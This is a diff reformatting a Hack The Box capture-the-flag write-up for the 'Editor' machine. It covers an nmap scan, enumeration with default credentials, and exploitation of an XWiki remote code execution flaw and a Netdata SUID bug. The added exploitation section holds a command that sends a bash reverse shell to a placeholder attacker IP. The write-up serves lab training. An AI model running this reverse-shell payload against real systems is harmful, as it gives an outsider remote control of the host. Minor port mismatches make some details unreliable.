@@ -1,3 +1,4 @@
+##
 # 📝 Write-up: Editor HTB
 
 ![editor](https://www.hackthebox.com/storage/avatars/7d4a6dfe5b291cbe7b4e13e5f5c4d6c3.png)
@@ -10,9 +11,9 @@
 
 ## 🎯 Summary
 Editor is an **easy Linux machine** that involves:  
-- Exploiting an **XWiki RCE** (CVE-2025-24893) for initial access.  
-- Leveraging **password reuse** for horizontal privilege escalation.  
-- Abusing a **Netdata SUID binary** (CVE-2024-32019) to get root.  
+- Exploiting an **XWiki RCE** (CVE-2025-24893) for initial access  
+- Leveraging **password reuse** for horizontal privilege escalation  
+- Abusing a **Netdata SUID binary** (CVE-2024-32019) to get root  
 
 ---
 
@@ -33,6 +34,8 @@ Started with a **full port scan** using `nmap`:
 
 ```bash
 nmap -sC -sV -oA nmap/initial 10.10.11.80
+
+
 PORT     STATE SERVICE VERSION
 22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
 80/tcp   open  http    nginx 1.18.0 (Ubuntu)
@@ -40,23 +43,30 @@ PORT     STATE SERVICE VERSION
 3306/tcp open  mysql   MySQL 8.0.35-0ubuntu0.20.04.1
 8000/tcp open  http    nginx 1.18.0 (Ubuntu)
 9000/tcp open  http    Netdata Go.d.plugin 1.32.1
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
+```
 
 ## 🕵️ Enumeration
 
-Port 80/8000 - HTTP Servers
+### 🌐 Ports 80 / 8000 — HTTP Servers
+- **Port 80** → Hosts a static page with project documentation.  
+- **Port 8000** → Runs **XWiki 14.10.5**, a Java-based wiki platform.  
 
-    Port 80 hosts a static page with project documentation.
-    Port 8000 runs XWiki (version 14.10.5), a Java-based wiki platform.
+### ⚡ Port 3000 — Express Server
+- Node.js application with login functionality.  
+- Discovered **default credentials**: admin:admin
 
-Port 3000 - Express Server
+→ Grants access to project management dashboard.  
 
-    Node.js application with login functionality.
+### 📊 Port 9000 — Netdata
+- Running **Netdata 1.32.1** (real-time performance monitoring tool).  
+- Vulnerable to **CVE-2024-32019** → SUID privilege escalation.  
 
-    Discovered default credentials admin:admin → leads to project management dashboard.
 
-ort 9000 - Netdata
+## 🚀 Exploitation
+###  CVE-2025-24893 - XWiki RCE
+- Exploit Used: https://github.com/gunzf0x/CVE-2025-24893
 
-    Real-time performance monitoring tool (version 1.32.1).
-
-    Vulnerable to CVE-2024-32019 (SUID privilege escalation).
+bash ```
+python3 exploit.py -t http://editor.htb:8080 -c 'bash -i >& /dev/tcp/<YOuR_IP>/4444 0>&1'
+```
